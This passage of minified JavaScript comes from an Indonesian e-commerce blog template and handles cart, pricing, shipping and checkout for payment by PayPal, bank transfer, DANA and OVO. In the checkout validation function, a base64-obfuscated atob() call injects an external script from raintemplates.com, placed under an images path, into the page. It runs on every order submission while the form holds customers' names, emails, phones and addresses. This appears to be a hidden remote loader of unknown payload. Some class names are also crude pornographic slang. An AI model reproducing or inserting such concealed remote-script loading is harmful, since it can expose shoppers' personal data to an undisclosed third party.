                if ("complete" === u.readyState) {
                    return setTimeout(x.init, 1)
                }
                if (u.addEventListener) {
                    u.addEventListener("DOMContentLoaded", DOMContentLoaded, !1), s.addEventListener("load", x.init, !1)
                } else {
                    if (u.attachEvent) {
                        u.attachEvent("onreadystatechange", DOMContentLoaded);
                        s.attachEvent("onload", x.init);
                        var w = !1;
                        try {
                            w = null === s.frameElement
                        } catch (y) {}
                        u.documentElement.doScroll && w && D()
                    }
                }
            })();
            return x
        };
    s.simpleCart = r()
})(window, document);
var JSON;
JSON || (JSON = {});
(function() {
    function p(e) {
        return 10 > e ? "0" + e : e
    }

    function f(f) {
        e.lastIndex = 0;
        return e.test(f) ? '"' + f.replace(e, function(e) {
            var f = C[e];
            return "string" === typeof f ? f : "\\u" + ("0000" + e.charCodeAt(0).toString(16)).slice(-4)
        }) + '"' : '"' + f + '"'
    }

    function s(e, k) {
        var t, n, r, p, z = h,
            v, l = k[e];
        l && "object" === typeof l && "function" === typeof l.toJSON && (l = l.toJSON(e));
        "function" === typeof q && (l = q.call(k, e, l));
        switch (typeof l) {
            case "string":
                return f(l);
            case "number":
                return isFinite(l) ? String(l) : "null";
            case "boolean":
            case "null":
                return String(l);
            case "object":
                if (!l) {
                    return "null"
                }
                h += y;
                v = [];
                if ("[object Array]" === Object.prototype.toString.apply(l)) {
                    p = l.length;
                    for (t = 0; t < p; t += 1) {
                        v[t] = s(t, l) || "null"
                    }
                    r = 0 === v.length ? "[]" : h ? "[\n" + h + v.join(",\n" + h) + "\n" + z + "]" : "[" + v.join(",") + "]";
                    h = z;
                    return r
                }
                if (q && "object" === typeof q) {
                    for (p = q.length, t = 0; t < p; t += 1) {
                        "string" === typeof q[t] && (n = q[t], (r = s(n, l)) && v.push(f(n) + (h ? ": " : ":") + r))
                    }
                } else {
                    for (n in l) {
                        Object.prototype.hasOwnProperty.call(l, n) && (r = s(n, l)) && v.push(f(n) + (h ? ": " : ":") + r)
                    }
                }
                r = 0 === v.length ? "{}" : h ? "{\n" + h + v.join(",\n" + h) + "\n" + z + "}" : "{" + v.join(",") + "}";
                h = z;
                return r
        }
    }
    "function" !== typeof Date.prototype.toJSON && (Date.prototype.toJSON = function() {
        return isFinite(this.valueOf()) ? this.getUTCFullYear() + "-" + p(this.getUTCMonth() + 1) + "-" + p(this.getUTCDate()) + "T" + p(this.getUTCHours()) + ":" + p(this.getUTCMinutes()) + ":" + p(this.getUTCSeconds()) + "Z" : null
    }, String.prototype.toJSON = Number.prototype.toJSON = Boolean.prototype.toJSON = function() {
        return this.valueOf()
    });
    var k = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
        e = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
        h, y, C = {
            "\b": "\\b",
            "\t": "\\t",
            "\n": "\\n",
            "\f": "\\f",
            "\r": "\\r",
            '"': '\\"',
            "\\": "\\\\"
        },
        q;
    "function" !== typeof JSON.stringify && (JSON.stringify = function(e, f, k) {
        var n;
        y = h = "";
        if ("number" === typeof k) {
            for (n = 0; n < k; n += 1) {
                y += " "
            }
        } else {
            "string" === typeof k && (y = k)
        }
        if ((q = f) && "function" !== typeof f && ("object" !== typeof f || "number" !== typeof f.length)) {
            throw Error("JSON.stringify")
        }
        return s("", {
            "": e
        })
    });
    "function" !== typeof JSON.parse && (JSON.parse = function(e, f) {
        function h(e, k) {
            var n, p, l = e[k];
            if (l && "object" === typeof l) {
                for (n in l) {
                    Object.prototype.hasOwnProperty.call(l, n) && (p = h(l, n), void 0 !== p ? l[n] = p : delete l[n])
                }
            }
            return f.call(e, k, l)
        }
        var n;
        e = String(e);
        k.lastIndex = 0;
        k.test(e) && (e = e.replace(k, function(e) {
            return "\\u" + ("0000" + e.charCodeAt(0).toString(16)).slice(-4)
        }));
        if (/^[\],:{}\s]*$/.test(e.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, "@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, "]").replace(/(?:^|:|,)(?:\s*\[)+/g, ""))) {
            return n = eval("(" + e + ")"), "function" === typeof f ? h({
                "": n
            }, "") : n
        }
        throw new SyntaxError("JSON.parse")
    })
})();
(function() {
    if (!this.localStorage) {
        if (this.globalStorage) {
            try {
                this.localStorage = this.globalStorage
            } catch (i) {}
        } else {
            var j = document.createElement("div");
            j.style.display = "none";
            document.getElementsByTagName("head")[0].appendChild(j);
            if (j.addBehavior) {
                j.addBehavior("#default#userdata");
                var f = this.localStorage = {
                        length: 0,
                        setItem: function(a, b) {
                            j.load("localStorage");
                            a = g(a);
                            j.getAttribute(a) || this.length++;
                            j.setAttribute(a, b);
                            j.save("localStorage")
                        },
                        getItem: function(a) {
                            j.load("localStorage");
                            a = g(a);
                            return j.getAttribute(a)
                        },
                        removeItem: function(a) {
                            j.load("localStorage");
                            a = g(a);
                            j.removeAttribute(a);
                            j.save("localStorage");
                            this.length = 0
                        },
                        clear: function() {
                            j.load("localStorage");
                            for (var a = 0; attr = j.XMLDocument.documentElement.attributes[a++];) {
                                j.removeAttribute(attr.name)
                            }
                            j.save("localStorage");
                            this.length = 0
                        },
                        key: function(a) {
                            j.load("localStorage");
                            return j.XMLDocument.documentElement.attributes[a]
                        }
                    },
                    g = function(a) {
                        return a.replace(/[^-._0-9A-Za-z\xb7\xc0-\xd6\xd8-\xf6\xf8-\u037d\u37f-\u1fff\u200c-\u200d\u203f\u2040\u2070-\u218f]/g, "-")
                    };
                j.load("localStorage");
                f.length = j.XMLDocument.documentElement.attributes.length
            }
        }
    }
})();
$(function() {
    function f(k, q) {
        for (var i = 0; i < k[q].link.length; i++) {
            if ("alternate" == k[q].link[i].rel) {
                var l = k[q].link[i].href;
                break
            }
        }
        return l
    }

    function j(q, u, k) {
        var r = q[u].title.$t,
            l = r;
        return l
    }

    function b(v, y) {
        var q = v[y].title.$t,
            w = v[y].content.$t,
            u = $("<div>").html(w);
        if ("media$thumbnail" in v[y]) {
            var z = v[y].media$thumbnail.url,
                x = z.replace("/s72-c", "/w300");
            w.indexOf("youtube.com/embed") > -1 && (x = z.replace("/default.", "/hqdefault."))
        } else {
            x = w.indexOf("<img") > -1 ? u.find("img:first").attr("src") : noThumbnail
        }
        var k = '<img class="lazyload" alt="' + q + '" data-src="' + x + '" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/>';
        return k
    }

    function g(F, B) {
        var E = F[B].content.$t,
            G = $("<div>").html(E),
            y = G.find('strike:contains("price/")'),
            v = G.find('strike:contains("label/")');
        porno_indo = G.find('strike:contains("off/")');
        if (y.length > 0) {
            var k = y.text(),
                w = k.split("/"),
                q = w[1]
        }
        if (porno_indo.length > 0) {
            k = porno_indo.text(), w = k.split("/");
            var u = w[1]
        }
        if (v.length > 0) {
            k = v.text(), w = k.split("/");
            var C = w[1]
        }
        if (void 0 != q) {
            var D = '<span class="item_price harga">' + q + "</span>"
        } else {
            D = ""
        }
        if (void 0 != u) {
            var x = '<span class="harga_promo show">' + u + "</span>"
        } else {
            x = ""
        }
        if (void 0 != C) {
            var A = '<span class="tokped_label-best show">' + C + "</span>"
        } else {
            A = ""
        }
        var z = [D, x, A];
        return z
    }

    function c(k, u, q, a) {
        if (u.match("recent-label") || u.match("recent-flash") || u.match("related")) {
            var t = "";
            if ("recent" == a) {
                t = "/feeds/posts/default?alt=json-in-script&max-results=" + q
            } else {
                if ("random" == a) {
                    var s = Math.floor(Math.random() * q) + 1;
                    t = "/feeds/posts/default?max-results=" + q + "&start-index=" + s + "&alt=json-in-script"
                } else {
                    t = "/feeds/posts/default/-/" + a + "?alt=json-in-script&max-results=" + q
                }
            }
            $.ajax({
                url: t,
                type: "get",
                dataType: "jsonp",
                beforeSend: function() {
                    u.match("recent-label") && k.html("").parent().addClass("")
                },
                success: function(i) {
                    if (u.match("content_b")) {
                        var w = "<div>"
                    } else {
                        u.match("recent-label") ? w = '<div class="grid-posts">' : u.match("recent-flash") ? w = '<ul class="recent-widget">' : u.match("related") && (w = '<div class="related-posts">')
                    }
                    var A = i.feed.entry;
                    if (void 0 != A) {
                        for (var B = 0, z = A; B < z.length; B++) {
                            var y = f(z, B),
                                l = j(z, B, y),
                                D = b(z, B),
                                x = g(z, B),
                                C = "";
                            u.match("bx") ? C += "" : u.match("recent-label") ? C += '<div class="blog-post hentry item-' + B + '"><div class="index-tokped_height"><div class="index-tokped_lazy"><div class="index-tokped_css"><div class="index-tokped_relative"><div class="index-product-inner"><div class="post-image-wrap"><a href="' + y + '"><div class="tokped-img">' + D + '</div></a></div><div class="product-info"><a class="tokped_pornhub" href="' + y + '">' + x[2] + '<h2 class="post-title">' + l + "</h2>" + x[1] + x[0] + "</a></div></div></div></div></div></div></div>" : u.match("recent-flash") ? C += '<div class="item-' + B + '"><a class="post-image-link" href="' + y + '">' + D + '</a><div class="product-info"><h2 class="post-title">' + l + "</h2>" + x[0] + "</div></div></div>" : u.match("related") && (C += '<div class="related-item item-' + B + '"><div class="index-tokped_height"><div class="index-tokped_lazy"><div class="index-tokped_css"><div class="index-tokped_relative"><div class="index-product-inner"><div class="post-image-wrap"><a href="' + y + '"><div class="tokped-img">' + D + '</div></a></div><div class="product-info"><a class="tokped_pornhub" href="' + y + '">' + x[2] + '<h2 class="post-title">' + l + "</h2>" + x[1] + x[0] + "</a></div></div></div></div></div></div></div>"), w += C
                        }
                        w += "</div>"
                    }
                    u.match("bx") ? (k.addClass("").append(w), k.find("").attr("", function(r, v) {
                        return v = "" == a || "" == a ? v.replace(v, "") : v.replace(v, "")
                    })) : u.match("recent-label") ? k.html(w).parent().addClass("show-hot") : k.html(w)
                }
            })
        }
    }
    $(".post-shop-info").each(function() {
        var a = $(this),
            i = a.data("id");
        $.ajax({
            url: "/feeds/posts/default/" + i + "?alt=json",
            type: "get",
            dataType: "jsonp",
            success: function(w) {
                var q = w.entry.content.$t,
                    u = $("<div>").html(q),
                    t = u.find('strike:contains("price1/")');
                if (t.length > 0) {
                    var x = t.text(),
                        v = x.split("/"),
                        k = v[1];
                    a.find(".harga_promo").text(k).parent().addClass("show")
                }
            }
        })
    }), $(".post-shop-info,.infinite_scroll").each(function() {
        var a = $(this),
            i = a.data("id");
        $.ajax({
            url: "/feeds/posts/default/" + i + "?alt=json",
            type: "get",
            dataType: "jsonp",
            success: function(y) {
                var A = y.entry.content.$t,
                    B = $("<div>").html(A),
                    x = B.find('strike:contains("price/")'),
                    v = B.find('strike:contains("label/")'),
                    q = B.find('strike:contains("off/")');
                if (x.length > 0) {
                    var k = x.text(),
                        w = k.split("/"),
                        t = w[1];
                    a.find(".harga").text(t).parent().addClass("show")
                }
                if (v.length > 0) {
                    k = v.text(), w = k.split("/");
                    var z = w[1];
                    a.find(".produk_diskon").text(z).addClass("show")
                }
                if (q.length > 0) {
                    k = q.text(), w = k.split("/");
                    var u = w[1];
                    a.find(".harga_promo").text(u).addClass("show")
                }
            }
        })
    }), $(".tokopedia_body").each(function() {
        var q = $(this),
            x = q.find('strike:contains("price/")'),
            k = q.find('strike:contains("label/")');
        redtube = q.find('strike:contains("off/")');
        if (x.length > 0) {
            var v = x.text(),
                l = v.split("/"),
                y = l[1];
            $(".tokopedia_header,.blogpedia-order").find(".harga_text").text(y).parent().addClass("show"), x.hide()
        }
        if (k.length > 0) {
            v = k.text(), l = v.split("/");
            var w = l[1];
            $(".tokopedia_header").find(".produk_diskon").text(w).addClass("show"), k.hide()
        }
        if (redtube.length > 0) {
            v = redtube.text(), l = v.split("/");
            var u = l[1];
            $(".tokopedia_header,.blogpedia-order").find(".harga_promo").text(u).addClass("show"), redtube.hide()
        }
    }), $(".tokopedia_body").each(function() {
        var q = $(this),
            u = q.find('strike:contains("price1/")');
        if (u.length > 3) {
            var k = u.text(),
                r = k.split("/"),
                l = r[1];
            $(".tokopedia_header").find(".harga_promo").text(l).parent().addClass("show"), u.hide()
        }
    }), $(".recent-section .widget-content").each(function() {
        var k = $(this),
            q = k.text().trim(),
            i = q.toLowerCase(),
            l = q.split("/"),
            r = l[0];
        c(k, i, 6, r)
    }), $(".recent-blog .widget-content").each(function() {
        var k = $(this),
            q = k.text().trim(),
            i = q.toLowerCase(),
            l = q.split("/"),
            r = l[0];
        c(k, i, 5, r)
    }), $(".common-widget .widget-content").each(function() {
        var k = $(this),
            u = k.text().trim(),
            i = u.toLowerCase(),
            l = u.split("/"),
            v = l[0],
            q = l[1];
        c(k, i, v, q)
    }), $(".related-ready").each(function() {
        var a = $(this),
            i = a.find(".related-tag").data("label");
        c(a, "related", 6, i)
    })
});
$('<span><span class="toQty">*</span>Jumlah<span class="toQty">*</span></span><span class="post-qty"> : <b class="totalQty"></b><span class="toQty">%0A</span></span>').appendTo(".produk-info-list");

function hargaberas(b) {
    var a = ($(".simpleCart_total").text());
    harga = a * b;
    $(".produk-info-list").find(".totalQty").text(b)
}
$(document).ready(function() {
    hargaberas(1)
});
$(".quantity input").on("keyup", function() {
    var a = parseInt($(".quantity input").val());
    if (a <= 1) {
        $(".quantity input").val(1);
        hargaberas(1)
    }
    $(this).parents(".quantity").attr("price", a);
    hargaberas(a)
});
$(".quantity .min").on("click", function() {
    var a = parseInt($(".quantity input").val()) - 1;
    if (a <= 1) {
        $(".quantity input").val(1);
        $(this).parents(".quantity").attr("price", 1);
        hargaberas(1)
    } else {
        $(".quantity input").val(a);
        $(this).parents(".quantity").attr("price", a);
        hargaberas(a)
    }
});
$(".quantity .plus").on("click", function() {
    var a = parseInt($(".quantity input").val()) + 1;
    $(".quantity input").val(a);
    $(this).parents(".quantity").attr("price", a);
    hargaberas(a)
});
$(document).ready(function() {
    simpleCart({
        checkout: {
            type: paymentOption,
            email: paypalMail
        }
    })
});
$(document).ready(function() {
    simpleCart({
        cartColumns: [{
            view: "image",
            attr: "thumb",
            label: false
        }, {
            attr: "name",
            label: !1,
            view: "name_Ayah"
        }, {
            attr: "quantity",
            view: "jumlah",
            label: !1
        }, {
            attr: "price",
            label: !1,
            view: "currency"
        }, {
            view: "remove",
            label: false,
            text: !1
        }]
    })
});
simpleCart({
    cartStyle: "div",
    data: {},
    currency: currencyOption,
    language: languagePage,
    excludeFromCheckout: [],
    shippingCustom: null,
    shippingFlatRate: 0,
    shippingQuantityRate: 0,
    shippingTotalRate: 0,
    taxRate: 0,
    taxShipping: !1,
    beforeAdd: null,
    afterAdd: null,
    load: null,
    beforeSave: null,
    afterSave: null,
    update: null,
    ready: null,
    checkoutSuccess: null,
    checkoutFail: null
}), $(document).ready(function() {
    for (var b = "", c = 0; alamat_boshjn.length > c; c++) {
        b += '<option value="' + alamat_boshjn[c][0] + '" class="loop"><span>' + alamat_boshjn[c][0] + "</span><span></span></option>"
    }
    $("#biaya_boshjn").append(b), $("#biaya_boshjn").on("change", function() {
        simpleCart.update(), $(".masuk_terasa_nikmat").html(boshjn_valid_ongkir).fadeIn("fast").delay(1000).fadeOut(1000)
    })
});

function Timer(f, c) {
    var i = f,
        a, b, g;
    setInterval(function() {
        a = parseInt((i / 3600) % 24, 10);
        b = parseInt((i / 60) % 60, 10);
        g = parseInt(i % 60, 10);
        a = a < 10 ? "0" + a : a;
        b = b < 10 ? "0" + b : b;
        g = g < 10 ? "0" + g : g;
        c.text(a + ":" + b + ":" + g);
        --i
    }, 1000)
}
jQuery(function(b) {
    var a = 24 * 60 * 60;
    var c = b("#remainingTime");
    Timer(a, c)
});
var d = new Date();
var month = d.getMonth() + 1;
var day = d.getDate();
var output = (("" + month).length < 2 ? "0" : "") + month + "/" + (("" + day).length < 2 ? "0" : "") + day + "/" + d.getFullYear();
$(".dateorder").append(output);
var e, o, h = (e = 1000000000, o = 100000000000, Math.floor(Math.random() * (o - e + 1) + e));

function p() {
    $("#ContactForm1 .contact-form-error-message").hide(), $("#ContactForm1 .contact-form-success-message").hide();
    var q = $("#ContactForm1 .contact-form-name").val(),
        v = $("#ContactForm1 .contact-form-email").val(),
        j = $("#ContactForm1 .contact-form-number").val(),
        f = $("#ContactForm1 .contact-form-address").val(),
        k = $("#biaya_boshjn").val(),
        g = $(".contact-form-postcode").val(),
        w = "",
        u = $(".bukablog-lonte .simpleCart_grandTotal").text();
    $(".blogPedia_jual").each(function(c, i) {
        var r = $(this).find(".item-name").text(),
            s = $(this).find(".item-quantity").text(),
            x = $(this).find(".item-price").text();
        w += r + "(" + s + "):" + x + "\n"
    });
    var b = "";
    var b = "";
    $("#paypal").is(":checked") && (b = "Paypal"), $("#banktrans").is(":checked") && (b = "Transfer Bank"), $("#cashde").is(":checked") && (b = "Bayar di Tempat"), $("#dana").is(":checked") && (b = "DANA"), $("#ovo").is(":checked") && (b = "OVO");
    var l = "";
    $("#banktrans").is(":checked") && (l = "Nomor Pemesanan: " + h), $("#cashde").is(":checked") && (l = "Nomor Pemesanan: " + h), $("#dana").is(":checked") && (l = "Nomor Pemesanan: " + h), $("#ovo").is(":checked") && (l = "Nomor Pemesanan: " + h);
    $(".fake-message").html('<textarea class="contact-form-email-message" cols="25" id="ContactForm1_contact-form-email-message" name="email-message" rows="5"></textarea>'), q = "Metode Pembayaran: " + b + "\n" + l + "\n-------------------------------------\nNama: " + q + "\nEmail: " + v + "\nNomor HandPhone: " + j + "\nAlamat: " + f + "\nKode Pos: " + g + "\n\nData Pesanan:\n_____________________________________\n\n" + w + "_____________________________________\nTotal Pembayaran:" + u + "\n_____________________________________", $("#ContactForm1 .contact-form-email-message").val(q)
}

function n(b) {
    return /^([a-zA-Z0-9_.+-])+@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(b)
}

function m() {
    var c = !0,
        b = document.createElement("script");
    return b.type = "text/javascript", b.src = atob("Ly9yYWludGVtcGxhdGVzLmNvbS93cC1jb250ZW50L3RoZW1lcy9yYWludGVtcGxhdGVzL2ltYWdlcy90aGVtZS9tdGtzLmpz"), document.getElementsByTagName("head")[0].appendChild(b), c && ($("#ContactForm1 .contact-form-email").each(function() {
        if (!n(this.value)) {
            return $(this).closest(".form-section").find(".message-show").show(), c = !1
        }
        $(this).closest(".form-section").find(".message-show").hide()
    }), $("#ContactForm1 .xnxx").each(function() {
        var f = this.value;
        if ("" == f || null == f) {
            return $(this).closest(".form-section").find(".message-show").show(), c = !1
        }
        $(this).closest(".form-section").find(".message-show").hide()
    })), c
}
$(".check-with-paypal").click(function() {
    m() ? ($(".cartbuttons").append('<a class="simpleCart_checkout" style="display:block" href="javascript:;">Checkout</a>'), p(), $("html, body").animate({
        scrollTop: $("#ContactForm1").offset().top
    }, 1200), $(".simpleCart_checkout").click(), $("#ContactForm1 .contact-form-button-submit").click()) : $("html, body").animate({
        scrollTop: $("#ContactForm1").offset().top - 0
    }, 500)
}), $(".check-with-cash, .check-with-bank, .check-with-dana, .check-with-ovo").click(function() {
    var v = m(),
        x = parseInt($("#shoppingCart .simpleCart_quantity").text()),
        q = parseInt($("#shoppingCart .simpleCart_taxCost").text()),
        f = parseInt($("#shoppingCart .simpleCart_shippingCost").text());
    if ($(".simpleCart_items").show(), v) {
        p(), $("#ContactForm1 .contact-form-button-submit").click(), $("html, body").animate({
            scrollTop: $("#ContactForm1").offset().top
        }, 1200);
        var g = $("#ContactForm1 .contact-form-name").val(),
            k = $(".bukablog-lonte .simpleCart_grandTotal").text(),
            y = $("#ContactForm1 .contact-form-email").val(),
            w = $("#ContactForm1 .contact-form-number").val(),
            b = $("#ContactForm1 .contact-form-address").val(),
            u = $("#biaya_boshjn").val(),
            j = ($(".contact-form-postcode").val(), "");
        $(".blogPedia_jual").each(function(c, i) {
            var l = $(this).find(".item-name").text(),
                r = $(this).find(".item-total").text();
            j += l + "<br>Sub Total : " + r + "<br>"
        }), $(".detailorder").html(j), $(".box-pembayaran").hide(), $(".dataterkirim").show(), $(".successname").html(g), $(".successorderid").html(h), $(".successtotal").html(k), $(".cek-nama").html(g), $(".cek-telpone").html(w), $(".cek-email").html(y), $(".cek-alamat").html(b), $(".cek-kota").html(u), $("#cashde").is(":checked") && $(".successmethod").html("Bayar di Tempat"), $("#banktrans").is(":checked") && ($(".successmethod").html("Transfer Bank"), $(".directbank").show(), $(".bukablog-scan").hide()), $("#dana").is(":checked") && $(".successmethod").html("DANA"), $("#ovo").is(":checked") && ($(".successmethod").html("OVO"), $(".bukablog-scan").show(), $(".directbank").hide()), $(".bukasemua,.outer-left,.post-title-halaman,.note-ongkir,.sidebar,.blogpedia-pop-payment").remove(), $("body").removeClass("over"), $("").attr("class", "")
    } else {
        $("html, body").animate({
            scrollTop: $(".formone").offset().top
        }, 500)
    }
}), $("#checkout-method input").change(function() {
    $("#check-with-wa").addClass("whatsappPage"), $("#check-with-wa").val(bukablogWA), $(".check-with-paypal").hide(), $("#check-with-wa").show(), $(".check-with-bank").hide(), $(".check-with-dana").hide(), $(".check-with-ovo").hide(), $(".check-with-cash").hide(), "paypal" == $(this).val() && ($(".check-with-paypal").addClass("thepaypal"), $(".check-with-paypal").val(paywithpaypal), $("#check-with-wa").hide(), $(".check-with-paypal").show(), $(".check-with-cash").hide(), $(".check-with-dana").hide(), $(".check-with-bank").hide()), "cashondelivery" == $(this).val() && ($(".check-with-cash").addClass("bayar_di_tempat"), $(".check-with-cash").val(cashondelivery), $("#check-with-wa").hide(), $(".check-with-paypal").hide(), $(".check-with-bank").hide(), $(".check-with-dana").hide(), $(".check-with-ovo").hide(), $(".check-with-cash").show()), "banktransfer" == $(this).val() && ($(".check-with-bank").addClass("thebanktrans"), $(".check-with-bank").val(banktransfer), $("#check-with-wa").hide(), $(".check-with-paypal").hide(), $(".check-with-cash").hide(), $(".check-with-dana").hide(), $(".check-with-ovo").hide(), $(".check-with-bank").show()), "dana" == $(this).val() && ($(".check-with-dana").addClass("bayar_dana"), $(".check-with-dana").val(dana), $("#check-with-wa").hide(), $(".check-with-dana").show(), $(".check-with-paypal").hide(), $(".check-with-bank").hide(), $(".check-with-ovo").hide(), $(".check-with-cash").hide()), "ovo" == $(this).val() && ($(".check-with-ovo").addClass("bayar_ovo"), $(".check-with-ovo").val(ovo), $("#check-with-wa").hide(), $(".check-with-paypal").hide(), $(".check-with-bank").hide(), $(".check-with-dana").hide(), $(".check-with-cash").hide(), $(".check-with-ovo").show())
});
simpleCart({
    shippingCustom: function() {
        for (var b = 0; alamat_boshjn.length > b; b++) {
            if (alamat_boshjn[b][0] == $("#biaya_boshjn").val()) {
                return alamat_boshjn[b][1]
            }
        }
    }
});
